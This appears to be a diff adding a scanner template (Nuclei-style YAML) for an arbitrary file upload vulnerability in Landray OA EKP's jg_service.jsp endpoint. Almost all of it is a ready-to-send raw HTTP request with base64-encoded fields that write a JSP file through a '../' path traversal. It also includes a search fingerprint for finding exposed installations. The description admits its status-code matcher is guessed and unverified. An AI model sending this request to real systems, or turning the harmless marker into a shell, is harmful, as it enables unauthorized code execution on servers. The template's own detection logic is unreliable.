@@ -1,0 +1,49 @@
+id: poc-c696b4c12002af8422a6
+info:
+  name: 蓝凌OAEKPjg_service存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/c696b4c12002af8422a66f46ffcdda85
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: c696b4c12002af8422a66f46ffcdda85
+    fofa: + hunter`app.name="Landray 蓝凌OA"`
+http:
+- raw:
+  - 'POST /sys/attachment/sys_att_main/jg_service.jsp HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close
+
+    Content-type: application/x-www-form-urlencoded
+
+    Content-Length: 206
+
+
+    DBSTEP V3.0    124            0              999
+
+    DBSTEP=REJTVEVQ
+
+    OPTION=U0FWRUFTSFRNTA==
+
+    HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL3N0Yy5qc3A=
+
+    RECORDID=
+
+    DIRECTORY=
+
+
+    <% out.println(111*11);%>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
